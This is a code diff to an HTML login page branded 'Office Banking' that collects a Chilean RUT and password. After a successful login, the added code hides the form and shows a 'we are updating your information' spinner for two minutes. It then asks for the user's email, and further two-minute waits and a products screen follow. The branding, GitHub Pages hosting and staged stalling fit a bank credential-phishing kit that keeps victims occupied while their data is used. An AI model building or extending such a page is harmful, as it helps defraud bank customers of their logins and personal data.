@@ -5,11 +5,36 @@
   <title>Office Banking</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="stylesheet" href="styles.css">
+  <style>
+    .spinner {
+      border: 8px solid #f3f3f3;
+      border-top: 8px solid red;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 2s linear infinite;
+      margin: 20px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg);}
+      100% { transform: rotate(360deg);}
+    }
+    .hidden { display:none; }
+    .btn-red {
+      background-color: red;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      font-weight: bold;
+      cursor: pointer;
+    }
+  </style>
 </head>
 <body>
   <div class="login-box">
     <img src="logo-office-banking.png" alt="Office Banking" class="logo">
 
+    <!-- Formulario inicial -->
     <form id="loginForm">
       <label for="rut">RUT</label>
       <input type="text" id="rut" name="rut" placeholder="12.345.678-5" required>
@@ -33,6 +58,26 @@
       <button type="submit">Ingresar</button>
     </form>
     <div id="resultado"></div>
+
+    <!-- Pantalla de espera -->
+    <div id="pantallaEspera" class="hidden">
+      <h2>#Estamos actualizando la información, por favor espera...</h2>
+      <div class="spinner"></div>
+    </div>
+
+    <!-- Formulario de correo -->
+    <div id="formCorreo" class="hidden">
+      <h2>Necesitamos actualizar tu correo electrónico</h2>
+      <input type="email" id="correo" placeholder="Ingresa tu correo">
+      <button onclick="enviarCorreo()">Enviar</button>
+    </div>
+
+    <!-- Pantalla de productos disponibles -->
+    <div id="pantallaProductos" class="hidden">
+      <img src="logo-office-banking.png" alt="Office Banking" class="logo">
+      <h2>Tenemos algunos productos disponibles para tu Empresa</h2>
+      <button class="btn-red" onclick="continuarProductos()">Continuar</button>
+    </div>
 
     <div class="footer-icons">
       <div>📊<br>Indicadores Económicos</div>
@@ -83,13 +128,39 @@
         document.getElementById("resultado").innerText = data;
 
         if(response.ok){
-          // Redirige al frontend (GitHub Pages) donde está productos.html
-          setTimeout(()=> window.location.href = "productos.html", 1500);
+          // Ocultar login y mostrar pantalla de espera
+          document.getElementById("loginForm").style.display="none";
+          document.getElementById("pantallaEspera").classList.remove("hidden");
+
+          // Después de 2 minutos mostrar formulario de correo
+          setTimeout(()=>{
+            document.getElementById("pantallaEspera").classList.add("hidden");
+            document.getElementById("formCorreo").classList.remove("hidden");
+          }, 120000); // 2 minutos
         }
       } catch (error) {
         document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
       }
     });
+
+    function enviarCorreo(){
+      document.getElementById("formCorreo").classList.add("hidden");
+      document.getElementById("pantallaEspera").classList.remove("hidden");
+
+      setTimeout(()=>{
+        document.getElementById("pantallaEspera").classList.add("hidden");
+        document.getElementById("pantallaProductos").classList.remove("hidden");
+      }, 120000); // 2 minutos
+    }
+
+    function continuarProductos(){
+      document.getElementById("pantallaProductos").classList.add("hidden");
+      document.getElementById("pantallaEspera").classList.remove("hidden");
+
+      setTimeout(()=>{
+        window.location.href="productos.html";
+      }, 120000); // 2 minutos
+    }
   </script>
 </body>
 </html>
